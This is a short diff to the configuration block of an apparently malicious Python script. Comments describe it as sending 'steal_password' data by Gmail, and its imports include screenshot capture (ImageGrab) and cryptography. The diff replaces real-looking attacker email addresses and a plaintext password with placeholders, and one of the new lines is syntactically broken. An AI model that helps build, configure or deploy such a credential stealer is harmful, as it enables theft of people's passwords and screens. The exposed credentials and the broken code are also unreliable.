@@ -17,9 +17,9 @@ from email import encoders
 
 # don't forgot to active  https://www.google.com/settings/security/lesssecureapps
 
-addr_from = 'hakanonymos@gmail.com' # your email to send steal_password
-addr_to   = 'hakanonymos@hotmail.com ' # receive email
-password  = 'carding20' # Your gmail password
+addr_from = 'your@gmail.com' # your email to send steal_password
+addr_to   'receive email  ' # receive email
+password  = 'password for gmail' # Your gmail password
 
 from PIL import ImageGrab
 from cryptography.hazmat.backends import default_backend
